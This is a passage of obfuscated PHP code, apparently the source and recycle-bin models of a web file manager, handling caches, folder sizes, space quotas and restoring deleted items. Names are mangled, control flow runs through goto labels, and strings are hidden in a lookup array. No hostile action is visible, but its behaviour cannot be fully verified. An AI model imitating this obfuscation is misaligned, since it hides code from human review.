$this->_listDataApplyItem($c¦–‰Ÿ¨é”, $AøÊ©¦Ì¼†); goto bÚ„‘¹•Â‰; FŒóãç÷éç: $c¸âËº»í =& $_SERVER[Ïº«‚ßèÔˆø]; $AøÊ©¦Ì¼† = !1; $B¡˜Í®êî = intval($B¡˜Í®êî); goto eİòˆÈ„ªš; eİòˆÈ„ªš: $e»¶›¤­ñ = $c¸âËº»í[437] . intval($AøÊ©¦Ì¼†) . $c¸âËº»í[438] . $B¡˜Í®êî; $a„øÅƒğ = _get(self::$cachePathInfo, $e»¶›¤­ñ); if ($a„øÅƒğ) { return $a„øÅƒğ; } goto dÓì‚©æ­‰; bÚ„‘¹•Â‰: self::$cachePathInfo[$e»¶›¤­ñ] = $c¦–‰Ÿ¨é”; return $c¦–‰Ÿ¨é”; goto d¢ÂÄª¸¾; d¢ÂÄª¸¾: } public static $cachePathInfoMore = array(); public function pathInfoMore($eâó‰Ë‰«¢) { goto EÙ‰Ñ§çíŒ; EÙ‰Ñ§çíŒ: $cšÑ¥õÂ· =& $_SERVER[Ïº«‚ßèÔˆø]; $fâŒÑ—†è— = _get(self::$cachePathInfoMore, $eâó‰Ë‰«¢); if ($fâŒÑ—†è—) { return $fâŒÑ—†è—; } goto fŒ¸˜‡§š; Fš¤«Ñ°ğÀ: self::$cachePathInfoMore[$eâó‰Ë‰«¢] = $A÷¿÷¯•á¹; return $A÷¿÷¯•á¹; goto c÷äéÂ¸ç; fŒ¸˜‡§š: $A÷¿÷¯•á¹ = $this->pathInfo($eâó‰Ë‰«¢); if (!$A÷¿÷¯•á¹) { return !1; } if ($A÷¿÷¯•á¹[$cšÑ¥õÂ·[401]] == $cšÑ¥õÂ·[87]) { $A÷¿÷¯•á¹[$cšÑ¥õÂ·[81]] = $this->folderChildrenNumber($eâó‰Ë‰«¢); } goto Fš¤«Ñ°ğÀ; c÷äéÂ¸ç: } public function sourceInfo($D­¨ŞˆçÄ) { goto f‰°¡ùÓª; f‰°¡ùÓª: $B÷ÍÒš¿ğ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$D­¨ŞˆçÄ) { return array(); } $D­¨ŞˆçÄ = intval($D­¨ŞˆçÄ); goto BĞªˆÄÓä; f¼¬‡¹¢¹â: $e¢ù¨‘‹¿ò = $this->where(array($B÷ÍÒš¿ğ[394] => $D­¨ŞˆçÄ))->find(); self::$cacheSourceInfo[$bÂ¤©™Ææ¼] = $e¢ù¨‘‹¿ò; return self::$cacheSourceInfo[$bÂ¤©™Ææ¼]; goto C¨Ç±µ×§‰; BĞªˆÄÓä: $bÂ¤©™Ææ¼ = $B÷ÍÒš¿ğ[436] . $D­¨ŞˆçÄ; $B¶Ãí•ÚĞ‰ = _get(self::$cacheSourceInfo, $bÂ¤©™Ææ¼); if ($B¶Ãí•ÚĞ‰) { return $B¶Ãí•ÚĞ‰; } goto f¼¬‡¹¢¹â; C¨Ç±µ×§‰: } public function sourceCacheClear($C™òŒÇ–ÚĞ = false) { self::cacheClear($C™òŒÇ–ÚĞ); } public static function cacheClear($f„óŠÁ¿º« = false) { $f—ê¼¢Æª¶ =& $_SERVER[Ïº«‚ßèÔˆø]; if ($f„óŠÁ¿º« == !1) { goto e÷ÖÁ‘Ú‡¡; cËÒé‚®‰¾: self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); goto EÅ°Şâ¨§; e÷ÖÁ‘Ú‡¡: self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; goto cËÒé‚®‰¾; EÅ°Şâ¨§: return; goto Cõ—‡°‘è; Cõ—‡°‘è: } unset(self::$cacheSourceInfo[$f—ê¼¢Æª¶[436] . $f„óŠÁ¿º«]); unset(self::$cachePathInfoMore[$f„óŠÁ¿º«]); unset(self::$cachePathInfo[$f—ê¼¢Æª¶[1956] . $f„óŠÁ¿º«]); unset(self::$cachePathInfo[$f—ê¼¢Æª¶[1957] . $f„óŠÁ¿º«]); } public function metaSet($e©‘îëÙ¦, $bÃÆŞä¯»Ÿ = null, $f‚ÛÍ£Ôö” = null) { $cï‰øóÙ” = parent::metaSet($e©‘îëÙ¦, $bÃÆŞä¯»Ÿ, $f‚ÛÍ£Ôö”); if ($cï‰øóÙ”) { $this->sourceCacheClear($e©‘îëÙ¦); } return $cï‰øóÙ”; } public function pathInfoByPath($a•µçÕ÷É, $d›ˆ»à¸Ù) { $d¡Ä¦›†ºŸ =& $_SERVER[Ïº«‚ßèÔˆø]; $DøááÖùŸÌ = !$d›ˆ»à¸Ù ? array() : explode($d¡Ä¦›†ºŸ[8], trim($d›ˆ»à¸Ù, $d¡Ä¦›†ºŸ[8])); $B¹ÍİØ´µŒ = $a•µçÕ÷É; foreach ($DøááÖùŸÌ as $b‚ÆĞ³Ì‡ò) { $BŠ¦ö©Ì”§ = array($d¡Ä¦›†ºŸ[476] => $B¹ÍİØ´µŒ, $d¡Ä¦›†ºŸ[28] => $b‚ÆĞ³Ì‡ò); $D™Ÿ©£âù‘ = $this->where($BŠ¦ö©Ì”§)->select(); if (!$D™Ÿ©£âù‘) { return !1; } $D™Ÿ©£âù‘ = array_sort_by($D™Ÿ©£âù‘, $d¡Ä¦›†ºŸ[421]); $B¹ÍİØ´µŒ = $D™Ÿ©£âù‘[0][$d¡Ä¦›†ºŸ[394]]; } return $this->pathInfo($B¹ÍİØ´µŒ, !0); } protected function updateModifyTime($Cøøƒí‚¬°) { goto BéòˆÙ‰ï; C­º¨Éãƒ: foreach ($Cøøƒí‚¬° as $aÙÂå¦›÷¹ => $d·ñ Æ³œ³) { $Cøøƒí‚¬°[$aÙÂå¦›÷¹] = intval($d·ñ Æ³œ³); $this->sourceCacheClear($d·ñ Æ³œ³); } $c”ÏñÍ…§· = array($D¡§Â‹¾ÏÚ[394] => array($D¡§Â‹¾ÏÚ[7], $Cøøƒí‚¬°)); $C·¢¨‹Ø‹ = array($D¡§Â‹¾ÏÚ[551] => USER_ID, $D¡§Â‹¾ÏÚ[415] => time()); goto F‰éÌõ•¥©; BéòˆÙ‰ï: $D¡§Â‹¾ÏÚ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$Cøøƒí‚¬°) { return; } if (!is_array($Cøøƒí‚¬°)) { $Cøøƒí‚¬° = array($Cøøƒí‚¬°); } goto C­º¨Éãƒ; F‰éÌõ•¥©: $this->where($c”ÏñÍ…§·)->save($C·¢¨‹Ø‹); goto cÏˆÆÍà§¤; cÏˆÆÍà§¤: } public function folderSizeReset($BëìİÓ­ìí, $d¢ñìè»• = false) { goto f¡„øÁÉ‡½; f¡„øÁÉ‡½: $C»å’Íëùõ =& $_SERVER[Ïº«‚ßèÔˆø]; if ($this->statusIgnoreResetSpace) { return; } $a‘¡¤’²©ì = $this->sourceInfo($BëìİÓ­ìí); goto a ÖËÀÇòé; aóôŞ³›ñ•: $FÄ«± ±[] = $a‘¡¤’²©ì[$C»å’Íëùõ[394]]; $eœÁ­‡ˆ¤ = array($C»å’Íëùõ[394] => array($C»å’Íëùõ[409], $FÄ«± ±)); if ($d¢ñìè»• < 0) { $eœÁ­‡ˆ¤[$C»å’Íëùõ[78]] = array($C»å’Íëùõ[956], abs($d¢ñìè»•)); } goto DÒ¢”½†‘ø; f¦Î¸‘Ü¯ö: $e‹Õå”æ‚© = array($a‘¡¤’²©ì[$C»å’Íëùõ[402]], $a‘¡¤’²©ì[$C»å’Íëùõ[482]]); TaskRun::timeLimitCall($Eî¯ƒƒÁÚ, $C»å’Íëùõ[1960], $e‹Õå”æ‚©, 1.5); goto aßàÈ¬‰Öˆ; a ÖËÀÇòé: $CÍÔ¥”„æè = $C»å’Íëùõ[1958] . $BëìİÓ­ìí; CacheLock::lock($CÍÔ¥”„æè, 20); if ($d¢ñìè»• === !1) { $this->sourceCacheClear($BëìİÓ­ìí); $a‘¡¤’²©ì = $this->sourceInfo($BëìİÓ­ìí); $eœÁ­‡ˆ¤ = array($C»å’Íëùõ[393] => $BëìİÓ­ìí, $C»å’Íëùõ[420] => 0); $eä¼“ƒø§ = $this->where($eœÁ­‡ˆ¤)->sum($C»å’Íëùõ[78]); $d¢ñìè»• = intval($eä¼“ƒø§) - intval($a‘¡¤’²©ì[$C»å’Íëùõ[78]]); } goto E™éœ·‚«; DÒ¢”½†‘ø: $this->where($eœÁ­‡ˆ¤)->setAdd($C»å’Íëùõ[78], $d¢ñìè»•); CacheLock::unlock($CÍÔ¥”„æè); $Eî¯ƒƒÁÚ = $C»å’Íëùõ[1959] . $a‘¡¤’²©ì[$C»å’Íëùõ[402]] . $C»å’Íëùõ[4] . $a‘¡¤’²©ì[$C»å’Íëùõ[482]]; goto f¦Î¸‘Ü¯ö; E™éœ·‚«: if ($d¢ñìè»• == 0) { return CacheLock::unlock($CÍÔ¥”„æè); } $FÄ«± ± = $this->parentLevelArray($a‘¡¤’²©ì[$C»å’Íëùõ[485]]); if (!$FÄ«± ±) { $FÄ«± ± = array(); } goto aóôŞ³›ñ•; aßàÈ¬‰Öˆ: } public function folderSizeResetChildren($bç‘ÔÖù†) { goto DÛš©Õ–‹„; DÛš©Õ–‹„: $d¼­ÓË¼Óğ =& $_SERVER[Ïº«‚ßèÔˆø]; $this->sourceCacheClear($bç‘ÔÖù†); $CÃ…„Ø³­æ = $this->sourceInfo($bç‘ÔÖù†); goto AÖ¶¢‚¿Ó; dä±ÅÒÂğ: foreach ($c›§Ö¶Áµ as $d—†Æ±«Çç) { if ($d—†Æ±«Çç[$d¼­ÓË¼Óğ[78]] == $d—†Æ±«Çç[$d¼­ÓË¼Óğ[1962]]) { continue; } $eƒñ‘¨ª‘”[] = array($d¼­ÓË¼Óğ[394], $d—†Æ±«Çç[$d¼­ÓË¼Óğ[394]], $d¼­ÓË¼Óğ[78], $d—†Æ±«Çç[$d¼­ÓË¼Óğ[78]]); } $this->saveAll($eƒñ‘¨ª‘”); goto aïÇº®ì±ˆ; eŠ¶—ù„°µ: $c›§Ö¶Áµ[] = $CÃ…„Ø³­æ; $c›§Ö¶Áµ = array_to_keyvalue($c›§Ö¶Áµ, $d¼­ÓË¼Óğ[394]); foreach ($c›§Ö¶Áµ as $Dš×°Ê¾× => $d—†Æ±«Çç) { $c›§Ö¶Áµ[$Dš×°Ê¾×][$d¼­ÓË¼Óğ[1962]] = $c›§Ö¶Áµ[$Dš×°Ê¾×][$d¼­ÓË¼Óğ[78]]; $c›§Ö¶Áµ[$Dš×°Ê¾×][$d¼­ÓË¼Óğ[78]] = 0; } goto d²…ŸÆ«‡; a§ï±ƒĞë: $bÌ•Šø¨õö[$d¼­ÓË¼Óğ[401]] = 0; $EåëğÀÍĞ = $this->field($fÌ’á‘ÄÑ±)->where($bÌ•Šø¨õö)->select(); if (!$EåëğÀÍĞ) { return; } goto eŠ¶—ù„°µ; d²…ŸÆ«‡: foreach ($EåëğÀÍĞ as $d—†Æ±«Çç) { $bªŞƒàµ Ú = $d—†Æ±«Çç[$d¼­ÓË¼Óğ[476]] . $d¼­ÓË¼Óğ[33]; if (!isset($c›§Ö¶Áµ[$bªŞƒàµ Ú])) { continue; } if ($d—†Æ±«Çç[$d¼­ÓË¼Óğ[421]] == $c›§Ö¶Áµ[$bªŞƒàµ Ú][$d¼­ÓË¼Óğ[421]]) { $c›§Ö¶Áµ[$bªŞƒàµ Ú][$d¼­ÓË¼Óğ[78]] += $d—†Æ±«Çç[$d¼­ÓË¼Óğ[78]]; } } foreach ($c›§Ö¶Áµ as $d—†Æ±«Çç) { $dŒìŠ©Øë = $this->parentLevelArray($d—†Æ±«Çç[$d¼­ÓË¼Óğ[485]]); foreach ($dŒìŠ©Øë as $bªŞƒàµ Ú) { $bªŞƒàµ Ú = $bªŞƒàµ Ú . $d¼­ÓË¼Óğ[33]; if (!isset($c›§Ö¶Áµ[$bªŞƒàµ Ú])) { continue; } if ($d—†Æ±«Çç[$d¼­ÓË¼Óğ[421]] == $c›§Ö¶Áµ[$bªŞƒàµ Ú][$d¼­ÓË¼Óğ[421]]) { $c›§Ö¶Áµ[$bªŞƒàµ Ú][$d¼­ÓË¼Óğ[78]] += $d—†Æ±«Çç[$d¼­ÓË¼Óğ[78]]; } } } $eƒñ‘¨ª‘” = array(); goto dä±ÅÒÂğ; AÖ¶¢‚¿Ó: $bÌ•Šø¨õö = array($d¼­ÓË¼Óğ[545] => 1, $d¼­ÓË¼Óğ[552] => array($d¼­ÓË¼Óğ[511], $CÃ…„Ø³­æ[$d¼­ÓË¼Óğ[485]] . $bç‘ÔÖù† . $d¼­ÓË¼Óğ[512])); $fÌ’á‘ÄÑ± = $d¼­ÓË¼Óğ[1961]; $c›§Ö¶Áµ = $this->field($fÌ’á‘ÄÑ±)->where($bÌ•Šø¨õö)->select(); goto a§ï±ƒĞë; aïÇº®ì±ˆ: } public function userSpaceReset($DËÜó¼ˆ¨ = false) { $eÅ«Ëˆ™†¨ =& $_SERVER[Ïº«‚ßèÔˆø]; $CÄêÖ•äŸ½ = $this->where(array($eÅ«Ëˆ™†¨[402] => self::TYPE_USER, $eÅ«Ëˆ™†¨[482] => $DËÜó¼ˆ¨, $eÅ«Ëˆ™†¨[401] => 0))->sum($eÅ«Ëˆ™†¨[78]); $CÄêÖ•äŸ½ = !$CÄêÖ•äŸ½ || $CÄêÖ•äŸ½ <= 0 ? 0 : $CÄêÖ•äŸ½; Model($eÅ«Ëˆ™†¨[501])->userEdit($DËÜó¼ˆ¨, array($eÅ«Ëˆ™†¨[1657] => $CÄêÖ•äŸ½)); } public function targetSpaceUpdate($E“Îª™¡ˆ, $f¥óÜŞ™Çİ) { $A‘Œ²§±¨ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$f¥óÜŞ™Çİ) { return; } if (!in_array($E“Îª™¡ˆ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $b´Ä½ˆÁ†İ = $this->targetSpaceSize($E“Îª™¡ˆ, $f¥óÜŞ™Çİ); if ($E“Îª™¡ˆ == self::TYPE_USER) { Model($A‘Œ²§±¨[501])->userEdit($f¥óÜŞ™Çİ, array($A‘Œ²§±¨[1657] => $b´Ä½ˆÁ†İ)); } else { if ($E“Îª™¡ˆ == self::TYPE_GROUP) { Model($A‘Œ²§±¨[484])->groupEdit($f¥óÜŞ™Çİ, array($A‘Œ²§±¨[1657] => $b´Ä½ˆÁ†İ)); } } } public function targetSpaceSize($a¶îÌÃÁà, $Eæ­ğ´Ó) { goto a‡‚¹óì­œ; EÚ©ÄĞÃ›: $BÉ öŒá÷´ = floatval($aÜªÕˆ¹±[$AÒ‰šèÕ„‚[78]]); $FÔèù‘¾§ = array($AÒ‰šèÕ„‚[552] => array($AÒ‰šèÕ„‚[511], $AÒ‰šèÕ„‚[497] . $aÜªÕˆ¹±[$AÒ‰šèÕ„‚[394]] . $AÒ‰šèÕ„‚[512])); $Cö‹¡ï†Ø¢ = Model($AÒ‰šèÕ„‚[419])->field($AÒ‰šèÕ„‚[408])->where($FÔèù‘¾§)->select(); goto C Î²ãÕ‚ï; C Î²ãÕ‚ï: $Cö‹¡ï†Ø¢ = array_to_keyvalue($Cö‹¡ï†Ø¢, $AÒ‰šèÕ„‚[33], $AÒ‰šèÕ„‚[394]); $Cö‹¡ï†Ø¢ = array_unique(array_filter($Cö‹¡ï†Ø¢)); if ($Cö‹¡ï†Ø¢) { $FÔèù‘¾§ = array($AÒ‰šèÕ„‚[408] => array($AÒ‰šèÕ„‚[409], $Cö‹¡ï†Ø¢)); $BÉ öŒá÷´ += floatval($this->where($FÔèù‘¾§)->sum($AÒ‰šèÕ„‚[78])); } goto fçóù•¥Ø„; fçóù•¥Ø„: $BÉ öŒá÷´ = !$BÉ öŒá÷´ || $BÉ öŒá÷´ <= 0 ? 0 : $BÉ öŒá÷´; return $BÉ öŒá÷´; goto Aœ¹ÂòÈ±; a‡‚¹óì­œ: $AÒ‰šèÕ„‚ =& $_SERVER[Ïº«‚ßèÔˆø]; $aÜªÕˆ¹± = $this->sourceRoot($a¶îÌÃÁà, $Eæ­ğ´Ó, !0); if (!$aÜªÕˆ¹±) { return 0; } goto EÚ©ÄĞÃ›; Aœ¹ÂòÈ±: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($AÁÒ×½’Ó) { return $this->fileTypeProfile($AÁÒ×½’Ó, SourceModel::TYPE_USER); } public function groupFileTypeProfile($d®³ÖÃó˜”) { return $this->fileTypeProfile($d®³ÖÃó˜”, SourceModel::TYPE_GROUP); } private function fileTypeProfile($Bµ ×µê›ƒ, $E¦ØŠÎå¡Ü) { goto B¿ğ²ˆ¤ØÔ; fï³Ú§§‹›: if ($dÆ•µãÔàÊ) { return $dÆ•µãÔàÊ; } $d–ºö—õƒ = array($f¢é„¿Ê§È[545] => 0); if ($Bµ ×µê›ƒ != !1) { $d–ºö—õƒ[$f¢é„¿Ê§È[482]] = $Bµ ×µê›ƒ; $d–ºö—õƒ[$f¢é„¿Ê§È[402]] = $E¦ØŠÎå¡Ü; } goto dÛÔ†£‡ÂÌ; B¿ğ²ˆ¤ØÔ: $f¢é„¿Ê§È =& $_SERVER[Ïº«‚ßèÔˆø]; $CÂÇœÍÁØ = $f¢é„¿Ê§È[1963] . $Bµ ×µê›ƒ . $f¢é„¿Ê§È[71] . $E¦ØŠÎå¡Ü; $dÆ•µãÔàÊ = Cache::get($CÂÇœÍÁØ); goto fï³Ú§§‹›; Bï·‘íˆ†ø: foreach ($dù ™ê¾º as $DÈå‡î×» => $e¬ß•¾ãÅ) { $d–ºö—õƒ[$f¢é„¿Ê§È[403]] = $this->fileTypeWhere($DÈå‡î×»); $c˜Ê‡×‡[$DÈå‡î×»] = array($f¢é„¿Ê§È[1965] => $e¬ß•¾ãÅ[$f¢é„¿Ê§È[28]], $f¢é„¿Ê§È[1966] => $this->where($d–ºö—õƒ)->count(), $f¢é„¿Ê§È[547] => $this->where($d–ºö—õƒ)->sum($f¢é„¿Ê§È[78])); } Cache::set($CÂÇœÍÁØ, $c˜Ê‡×‡, 1200); return $c˜Ê‡×‡; goto Cß²ó™Ø”Ã; dÛÔ†£‡ÂÌ: $c˜Ê‡×‡ = array(); $c˜Ê‡×‡[$f¢é„¿Ê§È[1964]] = array($f¢é„¿Ê§È[1965] => LNG($f¢é„¿Ê§È[1964]), $f¢é„¿Ê§È[1966] => $this->where($d–ºö—õƒ)->count(), $f¢é„¿Ê§È[547] => $this->where($d–ºö—õƒ)->sum($f¢é„¿Ê§È[78])); $dù ™ê¾º = KodIO::fileTypeList(); goto Bï·‘íˆ†ø; Cß²ó™Ø”Ã: } public function fileNameExist($C‘¡ˆè‘•, $BÎÅªŞÍ˜ö) { $DãÅ½šîâ˜ =& $_SERVER[Ïº«‚ßèÔˆø]; $EöŸË…Ö•â = $this->where(array($DãÅ½šîâ˜[476] => $C‘¡ˆè‘•, $DãÅ½šîâ˜[28] => $BÎÅªŞÍ˜ö))->find(); return is_array($EöŸË…Ö•â) ? $EöŸË…Ö•â[$DãÅ½šîâ˜[394]] : !1; } public function childList($aÖÒ£Çìİ‘) { goto F¹æãöŒŠ; d°…ÁÌßƒ: self::$cacheChildList[$b¹ƒ¿‚‰¦Î] = $EçàêÛáìˆ; foreach ($EçàêÛáìˆ as $d›Ó¼â‘‹) { $b¹ƒ¿‚‰¦Î = $C¢…ñ–Ãà…[436] . $d›Ó¼â‘‹[$C¢…ñ–Ãà…[394]]; self::$cacheSourceInfo[$b¹ƒ¿‚‰¦Î] = $d›Ó¼â‘‹; } return $EçàêÛáìˆ; goto aâˆÃ¦À»; fõâÊ”¬Ú: $E•ƒÂÁ· = array($C¢…ñ–Ãà…[476] => intval($aÖÒ£Çìİ‘), $C¢…ñ–Ãà…[421] => 0); $EçàêÛáìˆ = $this->where($E•ƒÂÁ·)->select(); $EçàêÛáìˆ = $EçàêÛáìˆ ? $EçàêÛáìˆ : array(); goto d°…ÁÌßƒ; F¹æãöŒŠ: $C¢…ñ–Ãà… =& $_SERVER[Ïº«‚ßèÔˆø]; $b¹ƒ¿‚‰¦Î = $C¢…ñ–Ãà…[1941] . $aÖÒ£Çìİ‘; if (isset(self::$cacheChildList[$b¹ƒ¿‚‰¦Î])) { return self::$cacheChildList[$b¹ƒ¿‚‰¦Î]; } goto fõâÊ”¬Ú; aâˆÃ¦À»: } public function fileNameAuto($eëÉ—ÚºêÆ, $dºÃã‚Òæ©, $AÜÀäã“›± = REPEAT_RENAME, $DÒ‰Ââ”‡Œ = false) { $FÏ÷¤§°Óæ =& $_SERVER[Ïº«‚ßèÔˆø]; $Dª¤¬â†Š = $this->field($FÏ÷¤§°Óæ[28])->where(array($FÏ÷¤§°Óæ[476] => $eëÉ—ÚºêÆ, $FÏ÷¤§°Óæ[28] => array($FÏ÷¤§°Óæ[379], $dºÃã‚Òæ© . $FÏ÷¤§°Óæ[380])))->select(); $Dº•ö¬˜ª– = array_to_keyvalue($Dª¤¬â†Š, $FÏ÷¤§°Óæ[33], $FÏ÷¤§°Óæ[28]); return $this->fileNameAutoGet($Dº•ö¬˜ª–, $dºÃã‚Òæ©, $AÜÀäã“›±, $DÒ‰Ââ”‡Œ); } public function fileNameAutoGet($Bë÷ˆ³Ì, $Eéøîô¡í, $A¶ˆå¥Óæç, $cİ’®†ƒß ) { $c·²Çíˆî =& $_SERVER[Ïº«‚ßèÔˆø]; if ($A¶ˆå¥Óæç == REPEAT_REPLACE || !$Bë÷ˆ³Ì || !in_array_not_case($Eéøîô¡í, $Bë÷ˆ³Ì) || $cİ’®†ƒß  && $A¶ˆå¥Óæç != REPEAT_RENAME_FOLDER) { return $Eéøîô¡í; } if ($A¶ˆå¥Óæç == REPEAT_SKIP) { return !1; } $f‰›¼Ô‚œÙ = $c·²Çíˆî[95] . get_path_ext($Eéøîô¡í); $f‰›¼Ô‚œÙ = $f‰›¼Ô‚œÙ == $c·²Çíˆî[95] || $cİ’®†ƒß  ? $c·²Çíˆî[33] : $f‰›¼Ô‚œÙ; for ($a¾í™»Õ²Ä = 1; $a¾í™»Õ²Ä <= count($Bë÷ˆ³Ì) + 1; $a¾í™»Õ²Ä++) { $eëÚ¤Ú“Àä = substr($Eéøîô¡í, 0, strlen($Eéøîô¡í) - strlen($f‰›¼Ô‚œÙ)); $cÂ®£‰Ä†Œ = $eëÚ¤Ú“Àä . "\50{$a¾í™»Õ²Ä}\51{$f‰›¼Ô‚œÙ}"; if (!in_array_not_case($cÂ®£‰Ä†Œ, $Bë÷ˆ³Ì)) { return $cÂ®£‰Ä†Œ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\157\165\x72\x63\145\x5f\162\x65\x63\171\x63\x6c\x65"; protected $dataAuto = array(array("\143\162\145\141\164\145\x54\151\x6d\145", "\x74\151\155\x65", "\151\x6e\163\145\x72\164", "\x66\x75\156\143\164\151\x6f\156")); public function listData($e‡¤ÒÆÏ²ß = false) { $Dõàãê’Íœ =& $_SERVER[Ïº«‚ßèÔˆø]; $e‡¤ÒÆÏ²ß = $e‡¤ÒÆÏ²ß ? $e‡¤ÒÆÏ²ß : USER_ID; $Eîã¦º†ØŸ = $this->where(array($Dõàãê’Íœ[1500] => $e‡¤ÒÆÏ²ß))->select(); return array_to_keyvalue($Eîã¦º†ØŸ, $Dõàãê’Íœ[33], $Dõàãê’Íœ[394]); } public function moveToRecycle($BîÄõÆ®é) { goto B›ä©Ù›àÌ; B›ä©Ù›àÌ: $dë¯ÕÉÀ’™ =& $_SERVER[Ïº«‚ßèÔˆø]; $cÆßÁÊ³Ø’ = Model($dë¯ÕÉÀ’™[1187]); $d÷Ë—¡æËâ = $cÆßÁÊ³Ø’->sourceInfo($BîÄõÆ®é); goto cğÄƒ‘«‘Ï; dÒ»®À˜¸: $this->recycleMove($BîÄõÆ®é, 1); if ($d÷Ë—¡æËâ[$dë¯ÕÉÀ’™[401]] == $dë¯ÕÉÀ’™[87]) { $aéŞÔ²İÍŠ = array($dë¯ÕÉÀ’™[552] => array($dë¯ÕÉÀ’™[511], $d÷Ë—¡æËâ[$dë¯ÕÉÀ’™[485]] . $BîÄõÆ®é . $dë¯ÕÉÀ’™[512])); $cÆßÁÊ³Ø’->where($aéŞÔ²İÍŠ)->setField($dë¯ÕÉÀ’™[421], 1); } goto f„šÊË†åê; cğÄƒ‘«‘Ï: if (!$d÷Ë—¡æËâ || $d÷Ë—¡æËâ[$dë¯ÕÉÀ’™[421]] == $dë¯ÕÉÀ’™[87]) { return; } $C‘ã£¶ÜØµ = array($dë¯ÕÉÀ’™[408] => $BîÄõÆ®é, $dë¯ÕÉÀ’™[1500] => USER_ID, $dë¯ÕÉÀ’™[548] => $d÷Ë—¡æËâ[$dë¯ÕÉÀ’™[402]], $dë¯ÕÉÀ’™[549] => $d÷Ë—¡æËâ[$dë¯ÕÉÀ’™[482]], $dë¯ÕÉÀ’™[552] => $d÷Ë—¡æËâ[$dë¯ÕÉÀ’™[485]]); $this->add($C‘ã£¶ÜØµ); goto dÒ»®À˜¸; f„šÊË†åê: } public function clear() { $this->remove(!1); } public function remove($EòÛ®²Ç Ï = false, $f£ø¢¼ƒ˜ = false) { goto E“ó¡ñ²·‰; c›ªÑÖÁî: foreach ($DÀˆìïÜÌ as $d‘îÍº²Óæ) { if ($EòÛ®²Ç Ï != !1 && !in_array($d‘îÍº²Óæ, $EòÛ®²Ç Ï)) { continue; } $DƒëÅõæ«½ = $cŞ‰Ì¾ºÜ->sourceInfo($d‘îÍº²Óæ); $cŞ‰Ì¾ºÜ->remove($d‘îÍº²Óæ, !1); $B³¯éÀô¯  = $DƒëÅõæ«½[$fÓ†Ë’ğ[402]] . $fÓ†Ë’ğ[71] . $DƒëÅõæ«½[$fÓ†Ë’ğ[482]]; $AÇñÂÖÕ²[$B³¯éÀô¯ ] = array($fÓ†Ë’ğ[548] => $DƒëÅõæ«½[$fÓ†Ë’ğ[402]], $fÓ†Ë’ğ[482] => $DƒëÅõæ«½[$fÓ†Ë’ğ[482]]); $this->where(array($fÓ†Ë’ğ[394] => $d‘îÍº²Óæ))->delete(); } foreach ($AÇñÂÖÕ² as $dâ³Ÿ©ºŸ) { $cŞ‰Ì¾ºÜ->targetSpaceUpdate($dâ³Ÿ©ºŸ[$fÓ†Ë’ğ[402]], $dâ³Ÿ©ºŸ[$fÓ†Ë’ğ[482]]); } goto b©ÆÄğ›‡À; fÖà±Ù±á´: $DÀˆìïÜÌ = $this->listData($f£ø¢¼ƒ˜); $EòÛ®²Ç Ï = $EòÛ®²Ç Ï === !1 ? !1 : $EòÛ®²Ç Ï; $AÇñÂÖÕ² = array(); goto c›ªÑÖÁî; E“ó¡ñ²·‰: $fÓ†Ë’ğ =& $_SERVER[Ïº«‚ßèÔˆø]; $f£ø¢¼ƒ˜ = $f£ø¢¼ƒ˜ ? $f£ø¢¼ƒ˜ : USER_ID; $cŞ‰Ì¾ºÜ = Model($fÓ†Ë’ğ[1187]); goto fÖà±Ù±á´; b©ÆÄğ›‡À: } public function restore($fóøŞ„½· = false) { $B°ñèÀ÷ºˆ = $this->listData(); $this->_restoreSource($B°ñèÀ÷ºˆ, $fóøŞ„½·); } public function removeUserAll($cø§‚Ñâ…Ó) { $this->remove(!1, $cø§‚Ñâ…Ó); } private function _restoreSource($dÁ£œç Û, $dçŒ»Ç¡×) { goto Fœáóª—„º; Fœáóª—„º: $aîŸ›¹êÚ¯ =& $_SERVER[Ïº«‚ßèÔˆø]; $Aç”Ãƒ§Ì = Model($aîŸ›¹êÚ¯[1187]); $dçŒ»Ç¡× = $dçŒ»Ç¡× == !1 ? !1 : $dçŒ»Ç¡×; goto A»éµ”˜ÀÙ; BØ¸‘ˆÆØé: $Aç”Ãƒ§Ì->updateModifyTime($b±’‘Çİ÷); goto B“×÷Ù»°Ò; A»éµ”˜ÀÙ: if (!$dÁ£œç Û) { return !0; } $b±’‘Çİ÷ = array(); foreach ($dÁ£œç Û as $aÏ‡ÔŸª) { goto E£á‡×åÏ˜; c…ôÆŒ¶¦¦: $b±’‘Çİ÷[] = $d¾Ûõ«ÏÂØ[$aîŸ›¹êÚ¯[476]]; if ($d¾Ûõ«ÏÂØ[$aîŸ›¹êÚ¯[401]] == $aîŸ›¹êÚ¯[87]) { $b±’‘Çİ÷[] = $aÏ‡ÔŸª; } $Aç”Ãƒ§Ì->lockMoveEnd($aÏ‡ÔŸª); goto AŸÙ‚øÑğ„; aÓÍâÑªè…: if ($AÎÆÃ±°Â¥[$aîŸ›¹êÚ¯[421]] == $aîŸ›¹êÚ¯[87]) { continue; } $Aç”Ãƒ§Ì->lockMoveStart($aÏ‡ÔŸª); $this->recycleMove($aÏ‡ÔŸª, 0); goto FÅ©ØŒ¤ìÓ; FÅ©ØŒ¤ìÓ: if ($d¾Ûõ«ÏÂØ[$aîŸ›¹êÚ¯[401]] == $aîŸ›¹êÚ¯[87]) { $AŞ·×£”ïÛ = array($aîŸ›¹êÚ¯[552] => array($aîŸ›¹êÚ¯[511], $d¾Ûõ«ÏÂØ[$aîŸ›¹êÚ¯[485]] . $aÏ‡ÔŸª . $aîŸ›¹êÚ¯[512])); $Aç”Ãƒ§Ì->where($AŞ·×£”ïÛ)->setField($aîŸ›¹êÚ¯[421], 0); $this->restoreFolderChildren($aÏ‡ÔŸª, $dÁ£œç Û); } $this->where(array($aîŸ›¹êÚ¯[394] => $aÏ‡ÔŸª))->delete(); $Aç”Ãƒ§Ì->folderSizeReset($d¾Ûõ«ÏÂØ[$aîŸ›¹êÚ¯[476]]); goto c…ôÆŒ¶¦¦; E£á‡×åÏ˜: if ($dçŒ»Ç¡× != !1 && !in_array($aÏ‡ÔŸª, $dçŒ»Ç¡×)) { continue; } $d¾Ûõ«ÏÂØ = 